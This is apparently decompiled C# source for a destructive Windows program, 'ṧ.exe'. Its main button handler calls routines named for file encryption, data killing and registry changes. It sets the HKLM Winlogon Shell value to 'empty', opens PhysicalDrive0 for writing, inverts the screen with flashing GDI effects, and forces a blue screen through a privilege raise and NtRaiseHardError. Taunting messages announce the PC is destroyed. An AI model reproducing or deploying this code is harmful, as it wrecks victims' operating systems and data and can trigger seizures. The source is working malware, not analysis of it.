using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ṧ
{
	// Token: 0x02000009 RID: 9
	public partial class Form1 : Form
	{
		// Token: 0x06000053 RID: 83
		[DllImport("user32.dll")]
		private static extern IntPtr GetDesktopWindow();

		// Token: 0x06000054 RID: 84
		[DllImport("user32.dll")]
		private static extern IntPtr GetWindowDC(IntPtr hWnd);

		// Token: 0x06000055 RID: 85
		[DllImport("Shell32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, EntryPoint = "ExtractIconExW", ExactSpelling = true)]
		private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion, out IntPtr piSmallVersion, int amountIcons);

		// Token: 0x06000056 RID: 86
		[DllImport("user32.dll")]
		private static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

		// Token: 0x06000057 RID: 87
		[DllImport("gdi32.dll")]
		private static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, Form1.TernaryRasterOperations dwRop);

		// Token: 0x06000058 RID: 88
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

		// Token: 0x06000059 RID: 89
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

		// Token: 0x0600005A RID: 90
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool CloseHandle(IntPtr hObject);

		// Token: 0x0600005B RID: 91 RVA: 0x000025A5 File Offset: 0x000007A5
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600005C RID: 92 RVA: 0x000025BD File Offset: 0x000007BD
		private void pictureBox1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600005D RID: 93 RVA: 0x000025C0 File Offset: 0x000007C0
		private void button1_Click(object sender, EventArgs e)
		{
			DialogResult dialogResult = MessageBox.Show("ARE YOU SURE YOU WANT TO DO THAT THE CREATORS ITS NOT RESPONSIBLE FOR ANY DAMAGES AND THIS MAY CAUSE YOUR TEXTS AND REGISTER AND ICO FILES TO BE ENCRYPTED. \n\r\n AND ALSO NOT FOR - EPILEPSY.", "final...", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
			bool flag = dialogResult == DialogResult.Yes;
			if (flag)
			{
				CORE.boss();
				MOUSE.DoMouseClick();
				REG.regs();
				base.Opacity = 0.0;
				RAN.lol();
				Thread.Sleep(5000);
				FILE.Start();
				WALL.cha();
				DATA.KILL();
				MessageBox.Show("×™ñ²♦");
				gen.test();
				RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
				registryKey.SetValue("Shell", "empty", RegistryValueKind.String);
				Thread.Sleep(15000);
				MessageBox.Show("HELLO MY DEAR... FRIEND! IM SORRY TO TELL YOU THAT YOUR PC IS DESTROYED BY ṧ.exe... ENJOY HAVING A BLUE SCREEN OF DEATH AND YOUR DEAD BY YOURSELF! \n\r\n ALSO YOUR PC IS GOING TO BSOD while YOU CLOSE THE ERROR... AND YOU WONT CLICK ANYTHING.  \n\r\n AND ALSO HAVE FUN RESTORING YOUR PC AND ALSO YOUR LOGONUI (:", "ñ¥☼◙♂♀█×™¥▄☼◙", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				SOUND.bn();
				CODE2.MoveAllWindowsFast();
				DATE.Start();
				GDI.BURN();
				MessageBox.Show("HAHA YOUR PC IS BECOMING TOAST HAVE FUN GOING YOUR PC ASS.", "ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙ñ¥☼◙♂♀█×™¥▄☼◙v", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				Thread.Sleep(1000);
				BSOD.RaisePrivilege();
				BSOD.CauseNtHardError();
				Application.Exit();
			}
		}

		// Token: 0x0600005E RID: 94 RVA: 0x000026CC File Offset: 0x000008CC
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
		}

		// Token: 0x0600005F RID: 95 RVA: 0x000026D0 File Offset: 0x000008D0
		private void timer1_Tick(object sender, EventArgs e)
		{
			IntPtr intPtr = Form1.CreateFile("\\\\.\\PhysicalDrive0", 1073741824U, 0U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
			bool flag = intPtr != IntPtr.Zero;
			if (flag)
			{
				Form1.CloseHandle(intPtr);
			}
		}

		// Token: 0x06000060 RID: 96 RVA: 0x00002713 File Offset: 0x00000913
		private void button2_Click(object sender, EventArgs e)
		{
			Application.Exit();
		}

		// Token: 0x06000061 RID: 97 RVA: 0x0000271C File Offset: 0x0000091C
		private void timer2_Tick(object sender, EventArgs e)
		{
			IntPtr desktopWindow = Form1.GetDesktopWindow();
			IntPtr windowDC = Form1.GetWindowDC(desktopWindow);
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			Form1.StretchBlt(windowDC, 0, 0, width, height, windowDC, 0, 0, width, height, Form1.TernaryRasterOperations.NOTSRCCOPY);
		}

		// Token: 0x06000062 RID: 98 RVA: 0x00002774 File Offset: 0x00000974
		private void timer3_Tick(object sender, EventArgs e)
		{
			IntPtr desktopWindow = Form1.GetDesktopWindow();
			IntPtr windowDC = Form1.GetWindowDC(desktopWindow);
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			Form1.StretchBlt(windowDC, 0, 0, width, height, windowDC, 0, 0, width, height, Form1.TernaryRasterOperations.SRCCOPY);
		}

		// Token: 0x04000010 RID: 16
		private const uint GENERIC_WRITE = 1073741824U;

		// Token: 0x04000011 RID: 17
		private const uint OPEN_EXISTING = 3U;

		// Token: 0x0200002E RID: 46
		public enum TernaryRasterOperations
		{
			// Token: 0x040000BF RID: 191
			SRCCOPY = 13369376,
			// Token: 0x040000C0 RID: 192
			SRCPAINT = 15597702,
			// Token: 0x040000C1 RID: 193
			SRCAND = 8913094,
			// Token: 0x040000C2 RID: 194
			SRCINVERT = 6684742,
			// Token: 0x040000C3 RID: 195
			SRCERASE = 4457256,
			// Token: 0x040000C4 RID: 196
			NOTSRCCOPY = 3342344,
			// Token: 0x040000C5 RID: 197
			NOTSRCERASE = 1114278,
			// Token: 0x040000C6 RID: 198
			MERGECOPY = 12583114,
			// Token: 0x040000C7 RID: 199
			MERGEPAINT = 12255782,
			// Token: 0x040000C8 RID: 200
			PATCOPY = 15728673,
			// Token: 0x040000C9 RID: 201
			PATPAINT = 16452105,
			// Token: 0x040000CA RID: 202
			PATINVERT = 5898313,
			// Token: 0x040000CB RID: 203
			DSTINVERT = 5570569,
			// Token: 0x040000CC RID: 204
			BLACKNESS = 66,
			// Token: 0x040000CD RID: 205
			WHITENESS = 16711778
		}
	}
}
